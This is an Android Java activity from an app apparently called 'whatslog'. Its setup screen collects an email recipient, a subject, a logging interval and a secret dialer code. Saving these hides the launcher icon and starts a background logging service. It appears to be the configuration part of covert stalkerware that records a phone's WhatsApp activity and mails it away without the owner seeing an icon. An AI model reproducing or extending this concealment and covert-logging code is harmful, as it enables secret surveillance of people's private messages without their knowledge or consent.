package com.whatslog.activities;

import java.sql.SQLException;
import java.util.List;

import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

import com.j256.ormlite.android.apptools.OrmLiteBaseActivity;
import com.whatslog.MainService;
import com.whatslog.R;
import com.whatslog.Utils;
import com.whatslog.dao.DatabaseHelperConfiguracao;
import com.whatslog.dao.DatabaseHelperInternal;
import com.whatslog.model.Configuracao;

public class MainActivity extends OrmLiteBaseActivity<DatabaseHelperInternal> {

	private EditText intervalo,dias;
	private EditText to;
	private EditText dialer;
	private EditText subject;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		Utils.verifyLicense(this);

		if (isFirstTime()) {
			setContentView(R.layout.conf);
			intervalo = (EditText) findViewById(R.id.configuracao_intervalo);
			to = (EditText) findViewById(R.id.configuracao_to);
			dialer = (EditText) findViewById(R.id.configuracao_dialer);
			subject = (EditText) findViewById(R.id.configuracao_subject);
			dias = (EditText) findViewById(R.id.configuracao_dias);

		} else {
			setContentView(R.layout.main);
//			Utils.showIcon(false, this);
		}
	}

	@Override
	public boolean onMenuItemSelected(int featureId, MenuItem item) {
		int itemId = item.getItemId();
		if (itemId == R.id.action_settings) {
			Intent intent = new Intent(this, ConfActivity.class);
			setIntent(intent);
			startActivity(intent);
			return true;
		} else if (itemId == R.id.show_icon) {
			Utils.showIcon(true, this);
			return true;
		} else if (itemId == R.id.hide_icon) {
			Utils.showIcon(false, this);
			return true;
		} else {
			return super.onMenuItemSelected(featureId, item);
		}
	}

	// Start the service
	public void startNewService(View view) {
		startService(new Intent(this, MainService.class));
	}

	// Stop the service
	public void stopNewService(View view) {
		stopService(new Intent(this, MainService.class));
	}

	private boolean isFirstTime() {
		DatabaseHelperConfiguracao database = new DatabaseHelperConfiguracao(
				this);
		List<Configuracao> confs;
		try {
			confs = database.getDao().queryForAll();
			if (confs.size() > 0) {
				return false;
			}
			return true;
		} catch (SQLException e) {
			return false;
		}
	}

	public void showLog(View view) {
		Intent intent = new Intent(this, LogActivity.class);
		setIntent(intent);
		startActivityForResult(intent, 1);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	public void save(View view) {
		if (validate()) {
			try {
				DatabaseHelperConfiguracao database = new DatabaseHelperConfiguracao(
						this);

				List<Configuracao> confs = database.getDao().queryForAll();
				Configuracao conf = new Configuracao();

				if (confs.size() > 0) {
					conf = confs.get(0);
				}

				conf.setEmailTo(to.getText().toString());
				conf.setFirstTime(false);
				conf.setIntervalo(Integer.parseInt(intervalo.getText()
						.toString()));
				conf.setDialer(dialer.getText().toString());
				conf.setSubject(subject.getText().toString());
				conf.setDias(Integer.parseInt(dias.getText()
						.toString()));
				database.getDao().createOrUpdate(conf);

				//hide icon
				Utils.showIcon(false, this);

				startService(new Intent(this, MainService.class));

				finish();

			} catch (SQLException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	private boolean validate() {
		if (to.getText().toString().length()==0
				|| subject.getText().toString().length()==0
				|| intervalo.getText().toString().length()==0
				|| dias.getText().toString().length()==0
				|| dialer.getText().toString().length()==0) {
			Toast.makeText(this, getString(R.string.requerido), Toast.LENGTH_LONG).show();
			return false;
		}
		return true;
	}

}
